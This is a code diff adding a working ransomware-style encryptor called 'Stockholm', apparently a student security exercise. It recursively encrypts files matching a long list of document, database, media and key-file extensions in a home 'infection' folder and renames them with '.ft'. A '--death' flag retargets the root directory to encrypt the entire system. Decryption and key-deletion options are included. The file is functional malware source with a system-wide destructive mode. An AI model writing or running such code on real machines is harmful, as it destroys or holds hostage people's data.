@@ -1,15 +1,162 @@
 #!/usr/bin/env python3
 import sys
 import argparse
+import os
+import time
+import secrets
 from colorama import Fore, Style
+import cryptography
+from cryptography.fernet import Fernet
+import base64
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+
+KEYFILENAME = "key.stockholm"
+EXTENSIONS = [
+    ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw",
+    ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif",
+    ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm",
+    ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb",
+    ".mdb", ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf",
+    ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd", ".bat",
+    ".ps1", ".vbs", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php",
+    ".asp", ".rb", ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla",
+    ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv",
+    ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd",
+    ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif", ".png", ".bmp", ".jpg", ".jpeg",
+    ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak",
+    ".tbk", ".bz2", ".PAQ", ".ARC", ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm",
+    ".sldx", ".sti", ".sxi", ".602", ".hwp", ".snt", ".onetoc2", ".dwg", ".pdf",
+    ".wk1", ".wks", ".123", ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml",
+    ".msg", ".ost", ".pst", ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps",
+    ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt",
+    ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm",
+    ".docb", ".docx", ".doc"
+]
+
+def generate_key(password: str) -> bytes:
+    salt = secrets.token_bytes(16)
+    kdf = PBKDF2HMAC(
+        algorithm=hashes.SHA256(),
+        length=32,
+        salt=salt,
+        iterations=100000,
+    )
+    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
+    return key
+
+def generate_and_store_key() -> bytes:
+    if os.path.exists(KEYFILENAME):
+        print(f"{Fore.YELLOW}Warning: Key file {KEYFILENAME} already exists{Style.RESET_ALL}")
+        response = input("Do you want to overwrite it? (y/N): ")
+        if response.lower() != 'y':
+            print(f"{Fore.RED}Aborting encryption{Style.RESET_ALL}")
+            sys.exit(1)
+            
+    key = Fernet.generate_key()
+    try:
+        with open(KEYFILENAME, 'wb') as keyfile:
+            keyfile.write(key + b'\n')
+        return key
+    except Exception as e:
+        print(f"Error storing key: {str(e)}")
+        sys.exit(1)
+
+def load_key() -> bytes:
+    try:
+        with open(KEYFILENAME, 'rb') as keyfile:
+            return keyfile.read()
+    except Exception as e:
+        print(f"{Fore.RED}Error loading key: now you fucked up, if anything has been encrypted.{Style.RESET_ALL}")
+        sys.exit(1)
+
+def encrypt_file(filepath: str, key: bytes) -> bool:
+    try:
+        with open(filepath, 'rb') as file:
+            data = file.read()
+        
+        fernet = Fernet(key)
+        encrypted_data = fernet.encrypt(data)
+        
+        with open(filepath, 'wb') as file:
+            file.write(encrypted_data)
+        return True
+    except Exception as e:
+        print(f"Error encrypting {filepath}: {str(e)}")
+        return False
+
+def decrypt_file(filepath: str, key: bytes) -> bool:
+    try:
+        with open(filepath, 'rb') as file:
+            encrypted_data = file.read()
+        
+        fernet = Fernet(key)
+        decrypted_data = fernet.decrypt(encrypted_data)
+        
+        with open(filepath, 'wb') as file:
+            file.write(decrypted_data)
+        return True
+    except Exception as e:
+        print(f"Error decrypting {filepath}: {str(e)}")
+        return False
 
 def stock_print(tobeprinted):
     if not silent:
         print(tobeprinted)
 
+
+def get_exec_folder(death):
+    if death:
+        return "/"
+    else:
+        return os.path.join(os.path.expanduser('~'), 'infection')
+
+def find_files_rec(folder):
+    finalfiles = []
+    for root, dirs, files in os.walk(folder):
+        for file in files:
+            finalfiles.append(os.path.join(root, file))
+    return finalfiles
+
+def stockholm(action, files, death):
+   if len(files) == 0:
+       stock_print(f'{Fore.RED}Infection folder is not existent or empty{Style.RESET_ALL}')
+       sys.exit(1)
+       
+   if action:
+       stockholm_key = generate_and_store_key()
+       stock_print(f'{Fore.MAGENTA}Encrypting ...{Style.RESET_ALL}')
+   else:
+       stockholm_key = load_key()
+       stock_print(f'{Fore.GREEN}Decrypting ...{Style.RESET_ALL}')
+
+   for file in files:
+       if action:
+           if os.path.splitext(file)[1] in EXTENSIONS or death:
+               stock_print(f'{Fore.MAGENTA}Encrypting File: {Style.RESET_ALL}{file}')
+               encrypt_file(file, stockholm_key)
+               os.rename(file, file + ".ft")
+           else:
+               stock_print(f'{Fore.YELLOW}Skipping   File: {Style.RESET_ALL}{file} {Fore.YELLOW}(Not encryptable){Style.RESET_ALL}')
+       else:
+           base, ext = os.path.splitext(file)
+           if ext == '.ft' and os.path.splitext(base)[1] in EXTENSIONS:
+               if decrypt_file(file, stockholm_key):
+                   stock_print(f'{Fore.GREEN}Decrypting File: {Style.RESET_ALL}{file}')
+                   os.rename(file, file[:-3])
+               else:
+                   stock_print(f'{Fore.RED}Skipping   File: {Style.RESET_ALL}{file} {Fore.RED}(Decryption failed){Style.RESET_ALL}')
+           else:
+               if ext == '.ft':
+                   stock_print(f'{Fore.YELLOW}Skipping   File: {Style.RESET_ALL}{file} {Fore.YELLOW}(Not a valid encrypted file){Style.RESET_ALL}')
+               else:
+                   stock_print(f'{Fore.YELLOW}Skipping   File: {Style.RESET_ALL}{file} {Fore.YELLOW}(Not encrypted){Style.RESET_ALL}')
+       time.sleep(0.1)
+
 def main():
     global silent
     global encrypt
+    global folder
     try:
         parser = argparse.ArgumentParser(
             description="Encrypts parts of you system"
@@ -18,6 +165,16 @@ def main():
             "-v", "--version",
             action="store_true",
             help="to show the version of the program"
+        )
+        parser.add_argument(
+            "-c", "--clear",
+            action="store_true",
+            help="to flush encryption key"
+        )
+        parser.add_argument(
+            "-d", "--death",
+            action="store_true",
+            help="you better not touch!!!!!"
         )
         parser.add_argument(
             "-r", "--reverse",
@@ -33,17 +190,42 @@ def main():
         args = parser.parse_args()
         silent = args.silent
         decrypt = args.reverse
+        clear = args.clear
+        death = args.death
         if args.version:
-            if silent or decrypt:
+            if silent or decrypt or clear or death:
                 print(f'{Fore.RED}Dont combine any other option with -v or --version{Style.RESET_ALL}')
             else:
                 stock_print(f'{Fore.BLUE}v1.0 (stable){Style.RESET_ALL}')
-        else:
-            stock_print(f'{Fore.YELLOW}STOCKHOLM{Style.RESET_ALL}\n')
-            if decrypt:
-                stock_print(f'{Fore.GREEN}Decrypting ...{Style.RESET_ALL}')
+        elif args.clear:
+            if silent or decrypt or args.version or death:
+                print(f'{Fore.RED}Dont combine any other option with -c or --clear{Style.RESET_ALL}')
             else:
-                stock_print(f'{Fore.MAGENTA}Encrypting ...{Style.RESET_ALL}')
+                try:
+                    if os.path.exists(KEYFILENAME):
+                        os.remove(KEYFILENAME)
+                        stock_print(f'{Fore.GREEN}Successfully removed {KEYFILENAME}{Style.RESET_ALL}')
+                    else:
+                        stock_print(f'{Fore.YELLOW}No key file found at {KEYFILENAME}{Style.RESET_ALL}')
+                except Exception as e:
+                    print(f'{Fore.RED}Error removing key file: {str(e)}{Style.RESET_ALL}')
+                    sys.exit(1)
+        else:
+            if death:
+                print(f"{Fore.RED}!!! WARNING !!!: This will ERASE your SYSTEM{Style.RESET_ALL}")
+                response = input("Do you want to quit? (y/N): ")
+                if response.lower() == 'y':
+                    print(f"{Fore.RED}Aborting encryption{Style.RESET_ALL}")
+                    sys.exit(1)
+            stock_print(f'{Fore.YELLOW}STOCKHOLM{Style.RESET_ALL}')
+            folder = get_exec_folder(death)
+            if not folder:
+                stock_print(f'{Fore.RED}Infection Folder not found{Style.RESET_ALL}')
+                sys.exit(1)
+            if decrypt:
+                stockholm(0, find_files_rec(folder), death)
+            else:
+                stockholm(1, find_files_rec(folder), death)
     except Exception as e:
         print(f'{Fore.RED}Error: {e}{Style.RESET_ALL}')
         sys.exit(1)
